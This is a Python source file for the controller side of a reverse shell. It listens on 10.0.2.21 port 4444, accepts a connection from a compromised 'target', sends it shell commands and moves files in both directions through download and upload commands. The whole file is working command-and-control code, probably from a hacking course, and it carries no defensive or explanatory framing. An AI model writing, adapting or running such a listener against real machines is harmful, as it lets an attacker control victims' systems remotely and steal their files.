import socket
import json

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print(f"[+] Got a connection from {str(address)}")

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())  # Encode JSON string to bytes

    def reliable_send_file(self, data):
        self.connection.send(data)  # Send raw binary data

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode()  # Decode bytes to string
                return json.loads(json_data)  # Load the JSON string into a Python object
            except ValueError:  # Incomplete data? Keep receiving
                continue

    def reliable_receive_file(self):
        file_data = b""  # Initialize as bytes
        while True:
            chunk = self.connection.recv(1024)
            if chunk.endswith(b"EOF"):  # Check for the EOF marker
                file_data += chunk[:-3]  # Exclude "EOF"
                break
            file_data += chunk
        return file_data

    def execute_remotely(self, command):
        self.reliable_send(command)  # Send command to the target

        if command[0] == "exit":
            self.connection.close()  # Close connection on 'exit'
            exit()

        if command[0] == "download":
            return self.reliable_receive_file()  # Special handling for download
        else:
            return self.reliable_receive()  # Otherwise, receive normal command output

    def write_file(self, path, content):
        with open(path, "wb") as file:  # Write file in binary mode
            file.write(content)
            return "[+] Download Successful"

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return file.read()  # Read binary file for uploading
        except FileNotFoundError:
            return "[!] File not found: " + path
        except Exception as e:
            return f"[!] Failed to read file: {e}"

    def run(self):
        while True:
            command = input(">> ").split()  # Split user input into command list
            if command[0] == "upload":
                file_content = self.read_file(command[1])  # Read file content
                if isinstance(file_content, bytes):  # Check if valid file data
                    command.append(file_content.decode('latin1'))  # Append file content as part of the command
                else:
                    print(file_content)  # Print error if file read fails
                    continue

            result = self.execute_remotely(command)  # Execute the command

            if command[0] == "download":  # If download command
                result = self.write_file(command[1], result)  # Write to the specified file path

            print(result)  # Print result of the command


my_listener = Listener("10.0.2.21", 4444)
my_listener.run()
